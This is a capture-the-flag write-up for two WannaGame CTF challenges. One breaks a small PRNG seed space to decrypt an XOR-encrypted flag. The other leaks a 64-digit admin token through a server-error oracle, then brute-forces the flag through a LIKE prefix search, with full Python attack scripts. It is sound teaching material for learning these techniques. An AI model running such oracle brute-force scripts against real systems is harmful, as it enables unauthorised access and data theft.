WannaGame CTF (December)

## ✅ Random (100)
Theme: Crypto

Given:
```python
import random

random.seed(random.randint(0, 10000))
flag = [c for c in open("flag.txt", "rb").read()]
for _ in range(1337):
  flag = [x ^ y for x, y in zip(flag, [random.randint(0, 255) for _ in range(len(flag))])]
print(bytes(flag).hex())

# 0203e2c0dd20182bea1d00f41b25ad314740c3b239a32755bab1b3ca1a98f0127f1a1aeefa15a418e9b03ad25b3a92a46c0f5a6f41cb580f7d8a3325c76e66b937baea
```

Solve:
Analysing this python file, we see that it first seeds the random function with a random int in the range `[0, 10000]`. The flag file is read and the flag itself is repeated encrypted for 1337 iterations. Within each iteration, each character of the flag is XOR-ed with a random integer generated using the seeded random function. The function eventually prints out the encrypted flag in hex. 

XOR is a reversible operation: if we want to decrypt the flag, we can simply repeat the entire operation on the encrypted flag. This requires us to have the exact same sequence of random numbers generated by randint(), which in turn requires knowledge of the seed. 

As shown, the seed is in the range `[0, 10000]`, which is a relatively small range that we can brute-force. We'll write a Python script to brute-force to obtain the decrypted flag, stopping once we find one that begins with the flag format `W1{`. Run it and we find that the seed is 3790 and the flag is `W1{maybe_the_seed_is_too_small..._b32fe938a402c22144b9d6497fd5a709}`.

```python
import random

# Encrypted flag (hex string)
encrypted_str = "0203e2c0dd20182bea1d00f41b25ad314740c3b239a32755bab1b3ca1a98f0127f1a1aeefa15a418e9b03ad25b3a92a46c0f5a6f41cb580f7d8a3325c76e66b937baea"

byte_list = [encrypted_str[i:i+2] for i in range(0, len(encrypted_str), 2)]
byte_list = [int(byte, 16) for byte in byte_list] # Convert hex strings to integers

seeds = [i for i in range(0, 10001)] # Brute-force all possible seed values (0-10000)

for seed in seeds:
	print(f"Trying seed value {seed}")
	random.seed(seed)
	# XOR the bytes of the encrypted flag 1337 times
	flag = byte_list[:]
	for _ in range(1337):
		random_nums = [random.randint(0, 255) for _ in range(len(flag))]
		flag = [x ^ y for x, y in zip(flag, random_nums)]
	# Convert the byte list back to a byte string and decode
	try:
		flag_str = bytes(flag).decode('utf-8')
	except UnicodeDecodeError:
		flag_str = ''.join(chr(byte) for byte in flag) # Fallback in case of decoding issues
	# Check if the flag starts with "W1{"
	if flag_str.startswith("W1{"):
		print(f"Found seed: {seed}")
		print(f"Flag is: {flag_str}")
		break

print("Loop ended")
# seed: 3790
# W1{maybe_the_seed_is_too_small..._b32fe938a402c22144b9d6497fd5a709}
```


## ✅ Leak (480)
Theme: Web
Given:
- Flag format is described by this regex: `^W1{[0-9]+}$`, i.e. consists of all digits within curlies
- A bot site where you can submit a URL
- An app where you see users' posts
![[Captura de pantalla 2024-12-16 a las 14.40.45.png]]

Overview:
- Reveal admin's note (aka the flag)
	- gain admin privilege by leaking token --> once admitted as admin, can enter `k` parameter in the query to search for the admin post content (`k` is only processed if you prove yourself to be admin; and k is used to select posts)
	- In other words:
		- step 1: brute-force admin's token
		- step 2: brute-force admin post content (flag)

Solve:
Go onto the app where users' posts are displayed. Hints are given: we want to get the admin's note which presumably is the flag. 

Let's try running the flask app and inspecting the source code. This app uses a sqlite3 database under the hood. There is admin privilege available. Whether or not a user is an admin is authenticated using a token. 

We'll first try to find this admin token, and see if we can get the admin note to display once we send in a GET request along with the token parameter. 

How is the token checked? 
This function auth() is used to authenticate a token: (comments added)
```python
def auth(token):
	tmp = token
	if type(token) == list:
		tmp = "".join(tmp) # if token is list, turn it into a string first
	pat = re.compile("^\d+$") # define regex pattern: string consists of all digits; at least one digit
	# ^ beginning  $ end  d digit  + 1 or more chars
	if pat.match(tmp) == None: # if token does not match regex
		return False
	# token matches regex
	for i in range(len(AUTHENTICATION_TOKEN)): 
		if int(token[i]) != int(AUTHENTICATION_TOKEN[i]):
			print(token[i], flush=True)
			return False
	return True

# AUTHENTICATION_TOKEN = "".join([str(randint(0, 9)) for _ in range(64)])
```




For every character in the token, if it's not equal to the corresponding char in AUTHENTICATION_TOKEN, auth() returns false, which causes the `error.html` page to be returned. 

Where is the user token taken from? 
![[Captura de pantalla 2024-12-16 a las 15.38.49.png]]
Based on this part of the code, we see that we need to go to the route `/search` and give the token as part of the query parameter `token`. We can enter something like: `http://chall.w1playground.com:22222/search?token=1` as the URL. 

Inspecting the for-loop inside auth(), we can brute-force the token incrementally, because we get different responses from the server depending on whether it's correct or not. 
Send in one character only: 
- If correct > moves onto next iteration: token`[1]` causes an index error which results in an internal server error (response status code = 500)
![[Captura de pantalla 2024-12-16 a las 15.33.07.png]]
- If incorrect > "error.html"
![[Captura de pantalla 2024-12-16 a las 15.34.55.png]]

We have successfully tested that the first character of the token is "5". How long is the token? From `AUTHENTICATION_TOKEN = "".join([str(randint(0, 9)) for _ in range(64)])` in `app.py`, we see that it's 64 characters long. It's better to automate this!

We'll write a Python script using `requests` to finish brute-forcing the whole token:
```python
# leak_token.py
import requests

# prep GET request
url = "http://chall.w1playground.com:22222/search"
headers = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "en-US,en;q=0.5",
"Connection": "keep-alive",
"Host": "chall.w1playground.com:22222",
"Priority": "u=0, i",
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
}

token = ""
params = params = {"token": token + "0"}
response = requests.get(url, headers=headers, params=params)

while len(token) < 64: # token is 64 chars long
	for i in range(10):
		# print(f"try digit {i}")
		params = {"token": token + f"{i}"}
		response = requests.get(url, headers=headers, params=params)
		if response.status_code == 500 or "Search Results" in response.text: # correct char or entire token is correct
			token += str(i)
			print(f"Token is now: {token}")
			break

print(f"Final token: {token}")
print(f"Length of token: {len(token)}")
# Final token: 5452005252181943284069771531727600864785926578645050517149423905
```

Unfortunately, just including this token in the posts page does not display us the admin's note ... Digging around the source code reveals another parameter `k` within the app route for /search. This is only processed when you have admin's token. It is used to generate the SQL query for posts; specifically it's used to query for posts whose content begins with whatever value k holds: 
```python
keyword = request.args.get('k', "")
...
posts = cursor.execute("SELECT author, content FROM posts WHERE content like ?", (keyword.replace("%", "").replace("?", "") + "%",)).fetchall()
# SQL query for post content that begins with whatever the k param value is
```

So we can brute-force for a post whose content begins with the flag format `W1{`, character by character until we have the whole flag. 

However, we need some sort of feedback to tell us whether a character guess is correct. 

In `list.html`, we notice that:
```
{% if posts|count > 0 %}
	<img id="customImage" src="" loading="lazy"/>
{% endif %}
```

If the SQL query generated a match, there would be more than zero posts, and this image would load. Otherwise, this image would not load. In other words, the presence of the image is the feedback we'll use to determine whether a guess was correct.

We'll similarly write a Python script to automate this: 
```python
import requests

url = "http://chall.w1playground.com:22222/search"
headers = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "en-US,en;q=0.5",
"Connection": "keep-alive",
"Host": "chall.w1playground.com:22222",
"Priority": "u=0, i",
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
}

admin_token = "5452005252181943284069771531727600864785926578645050517149423905" # leaked from previous step
flag = "W1{"

# params = {
# "token": admin_token,
# "img": "troll.jpg",
# "k": flag
# }
# response = requests.get(url, headers=headers, params=params)
# print(response.text)
# print('<img id="customImage" src="" loading="lazy"/>' in response.text)
  
while True: # don't know how long the flag is...we'll know it's the end when we get to a pt it repeats testing the digits
	for i in range(10):
		params = {
		"token": admin_token,
		"img": "troll.jpg",
		"k": flag + str(i)
		}
		print(f"trying {i}")
		response = requests.get(url, headers=headers, params=params)
	# print(response.text)
		if '<img id="customImage" src="" loading="lazy"/>' in response.text:
			flag = flag + str(i)
			print(f"Flag is now: {flag}")

# Flag is now: W1{725238659297
```

Flag: 
	W1{725238659297}






